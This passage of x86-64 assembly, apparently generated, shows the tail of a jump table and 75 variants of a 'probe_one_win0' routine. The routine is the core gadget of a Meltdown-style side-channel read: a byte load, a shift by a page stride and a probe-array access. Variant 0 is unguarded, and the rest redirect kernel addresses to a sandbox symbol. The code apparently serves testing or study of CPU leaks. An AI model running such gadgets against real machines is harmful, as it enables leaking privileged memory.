	je	.Lprobe_one_win0_var438
	cmpl	$439, %eax
	je	.Lprobe_one_win0_var439
	cmpl	$440, %eax
	je	.Lprobe_one_win0_var440
	cmpl	$441, %eax
	je	.Lprobe_one_win0_var441
	cmpl	$442, %eax
	je	.Lprobe_one_win0_var442
	cmpl	$443, %eax
	je	.Lprobe_one_win0_var443
	cmpl	$444, %eax
	je	.Lprobe_one_win0_var444
	cmpl	$445, %eax
	je	.Lprobe_one_win0_var445
	cmpl	$446, %eax
	je	.Lprobe_one_win0_var446
	cmpl	$447, %eax
	je	.Lprobe_one_win0_var447
	cmpl	$448, %eax
	je	.Lprobe_one_win0_var448
	cmpl	$449, %eax
	je	.Lprobe_one_win0_var449
	cmpl	$450, %eax
	je	.Lprobe_one_win0_var450
	cmpl	$451, %eax
	je	.Lprobe_one_win0_var451
	cmpl	$452, %eax
	je	.Lprobe_one_win0_var452
	cmpl	$453, %eax
	je	.Lprobe_one_win0_var453
	cmpl	$454, %eax
	je	.Lprobe_one_win0_var454
	cmpl	$455, %eax
	je	.Lprobe_one_win0_var455
	cmpl	$456, %eax
	je	.Lprobe_one_win0_var456
	cmpl	$457, %eax
	je	.Lprobe_one_win0_var457
	cmpl	$458, %eax
	je	.Lprobe_one_win0_var458
	cmpl	$459, %eax
	je	.Lprobe_one_win0_var459
	cmpl	$460, %eax
	je	.Lprobe_one_win0_var460
	cmpl	$461, %eax
	je	.Lprobe_one_win0_var461
	cmpl	$462, %eax
	je	.Lprobe_one_win0_var462
	cmpl	$463, %eax
	je	.Lprobe_one_win0_var463
	cmpl	$464, %eax
	je	.Lprobe_one_win0_var464
	cmpl	$465, %eax
	je	.Lprobe_one_win0_var465
	cmpl	$466, %eax
	je	.Lprobe_one_win0_var466
	cmpl	$467, %eax
	je	.Lprobe_one_win0_var467
	cmpl	$468, %eax
	je	.Lprobe_one_win0_var468
	cmpl	$469, %eax
	je	.Lprobe_one_win0_var469
	cmpl	$470, %eax
	je	.Lprobe_one_win0_var470
	cmpl	$471, %eax
	je	.Lprobe_one_win0_var471
	cmpl	$472, %eax
	je	.Lprobe_one_win0_var472
	cmpl	$473, %eax
	je	.Lprobe_one_win0_var473
	cmpl	$474, %eax
	je	.Lprobe_one_win0_var474
	cmpl	$475, %eax
	je	.Lprobe_one_win0_var475
	cmpl	$476, %eax
	je	.Lprobe_one_win0_var476
	cmpl	$477, %eax
	je	.Lprobe_one_win0_var477
	cmpl	$478, %eax
	je	.Lprobe_one_win0_var478
	cmpl	$479, %eax
	je	.Lprobe_one_win0_var479
	cmpl	$480, %eax
	je	.Lprobe_one_win0_var480
	cmpl	$481, %eax
	je	.Lprobe_one_win0_var481
	cmpl	$482, %eax
	je	.Lprobe_one_win0_var482
	cmpl	$483, %eax
	je	.Lprobe_one_win0_var483
	cmpl	$484, %eax
	je	.Lprobe_one_win0_var484
	cmpl	$485, %eax
	je	.Lprobe_one_win0_var485
	cmpl	$486, %eax
	je	.Lprobe_one_win0_var486
	cmpl	$487, %eax
	je	.Lprobe_one_win0_var487
	cmpl	$488, %eax
	je	.Lprobe_one_win0_var488
	cmpl	$489, %eax
	je	.Lprobe_one_win0_var489
	cmpl	$490, %eax
	je	.Lprobe_one_win0_var490
	cmpl	$491, %eax
	je	.Lprobe_one_win0_var491
	cmpl	$492, %eax
	je	.Lprobe_one_win0_var492
	cmpl	$493, %eax
	je	.Lprobe_one_win0_var493
	cmpl	$494, %eax
	je	.Lprobe_one_win0_var494
	cmpl	$495, %eax
	je	.Lprobe_one_win0_var495
	cmpl	$496, %eax
	je	.Lprobe_one_win0_var496
	cmpl	$497, %eax
	je	.Lprobe_one_win0_var497
	cmpl	$498, %eax
	je	.Lprobe_one_win0_var498
	cmpl	$499, %eax
	je	.Lprobe_one_win0_var499
	jmp	.Lprobe_one_win0_var0
## Variant 0
.Lprobe_one_win0_var0:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 1
.Lprobe_one_win0_var1:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 2
.Lprobe_one_win0_var2:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 3
.Lprobe_one_win0_var3:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 4
.Lprobe_one_win0_var4:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 5
.Lprobe_one_win0_var5:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 6
.Lprobe_one_win0_var6:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 7
.Lprobe_one_win0_var7:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 8
.Lprobe_one_win0_var8:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 9
.Lprobe_one_win0_var9:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 10
.Lprobe_one_win0_var10:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 11
.Lprobe_one_win0_var11:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 12
.Lprobe_one_win0_var12:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 13
.Lprobe_one_win0_var13:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 14
.Lprobe_one_win0_var14:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 15
.Lprobe_one_win0_var15:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 16
.Lprobe_one_win0_var16:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 17
.Lprobe_one_win0_var17:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 18
.Lprobe_one_win0_var18:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 19
.Lprobe_one_win0_var19:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 20
.Lprobe_one_win0_var20:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 21
.Lprobe_one_win0_var21:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 22
.Lprobe_one_win0_var22:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 23
.Lprobe_one_win0_var23:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 24
.Lprobe_one_win0_var24:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 25
.Lprobe_one_win0_var25:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 26
.Lprobe_one_win0_var26:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 27
.Lprobe_one_win0_var27:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 28
.Lprobe_one_win0_var28:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 29
.Lprobe_one_win0_var29:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 30
.Lprobe_one_win0_var30:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 31
.Lprobe_one_win0_var31:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 32
.Lprobe_one_win0_var32:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 33
.Lprobe_one_win0_var33:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 34
.Lprobe_one_win0_var34:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 35
.Lprobe_one_win0_var35:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 36
.Lprobe_one_win0_var36:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 37
.Lprobe_one_win0_var37:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 38
.Lprobe_one_win0_var38:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 39
.Lprobe_one_win0_var39:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 40
.Lprobe_one_win0_var40:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 41
.Lprobe_one_win0_var41:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 42
.Lprobe_one_win0_var42:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 43
.Lprobe_one_win0_var43:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 44
.Lprobe_one_win0_var44:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 45
.Lprobe_one_win0_var45:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 46
.Lprobe_one_win0_var46:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 47
.Lprobe_one_win0_var47:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 48
.Lprobe_one_win0_var48:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 49
.Lprobe_one_win0_var49:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 50
.Lprobe_one_win0_var50:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 51
.Lprobe_one_win0_var51:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 52
.Lprobe_one_win0_var52:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 53
.Lprobe_one_win0_var53:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 54
.Lprobe_one_win0_var54:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 55
.Lprobe_one_win0_var55:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 56
.Lprobe_one_win0_var56:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 57
.Lprobe_one_win0_var57:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 58
.Lprobe_one_win0_var58:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 59
.Lprobe_one_win0_var59:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 60
.Lprobe_one_win0_var60:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 61
.Lprobe_one_win0_var61:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 62
.Lprobe_one_win0_var62:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 63
.Lprobe_one_win0_var63:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 64
.Lprobe_one_win0_var64:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 65
.Lprobe_one_win0_var65:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 66
.Lprobe_one_win0_var66:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 67
.Lprobe_one_win0_var67:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 68
.Lprobe_one_win0_var68:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 69
.Lprobe_one_win0_var69:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 70
.Lprobe_one_win0_var70:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 71
.Lprobe_one_win0_var71:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 72
.Lprobe_one_win0_var72:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 73
.Lprobe_one_win0_var73:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 74
.Lprobe_one_win0_var74:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
